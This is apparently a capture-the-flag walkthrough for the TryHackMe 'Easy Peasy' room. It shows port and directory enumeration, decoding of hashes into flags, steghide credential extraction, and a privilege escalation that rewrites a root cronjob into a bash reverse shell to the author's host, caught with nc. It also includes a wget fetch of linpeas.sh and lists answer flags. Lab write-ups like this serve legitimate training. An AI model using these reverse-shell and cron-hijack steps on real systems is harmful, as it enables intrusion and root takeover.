### [Challenge](https://tryhackme.com/room/easypeasyctf)

# IP:  10.10.176.242

- # ENUM
	- ## NMAP (```nmap -sV -p- -T5 10.10.90.150```)
		- ```PORT      STATE SERVICE VERSION
			80/tcp    open  http    nginx 1.16.1
			65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))```
			- (there should be another one, ssh at 6498)
	- ## GOBUSTER (```gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 10.10.90.150:65524```)
		- `/hidden`
			- `/whatever` --> `ZmxhZ3tmMXJzN19mbDRnfQ==
		- `/index.html` --> `ObsJmP173N2X6dOrAgEAL0Vu`
		- `/robots.txt` --> `a18672860d0510e5ab6699730763b250`


- # FIND FLAGS
	-  `ZmxhZ3tmMXJzN19mbDRnfQ==` --> base64 --> `flag{f1rs7_fl4g}`
	- `a18672860d0510e5ab6699730763b250` --> md5 --> `flag{1m_s3c0nd_fl4g}`
	- `ObsJmP173N2X6dOrAgEAL0Vu` --> base62 --> `/n0th1ng3ls3m4tt3r`
	- `940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81` -> GOST  -> `mypasswordforthatjob`
	- `steghide extract -sf binarycodepixabay.jpg` -> secrettext.txt
		- username: boring
		  password:
			01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001 -> `iconvertedmypasswordtobinary`

- # PRIVILEGE ESCALATION
	1. Connect via SSH (`ssh boring@10.10.176.242`)
	2.  `synt{a0jvgf33zfa0ez4y}` --> caesar cypher --> `flag{n0wits33msn0rm4l}`
	3. Use linpeas.sh (host python server -> `wget http://10.9.2.87:8000/linpeas.sh` --> `chmod +x linpeash.sh` -> `./linpeas.sh`)
	4. Sus cronjob found: `* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh`
	5. Edit `.mysecretcronjob.sh`:  
	   ``` bash
		#!/bin/bash
		bash -i >& /dev/tcp/10.9.2.87/9999 0>&1
		```
	6. Set your machine on listening (`sudo nc -lvnp 9999`)
	7. `cat /root/.root.txt` --> `flag{63a9f0ea7bb98050796b649e85481845}`
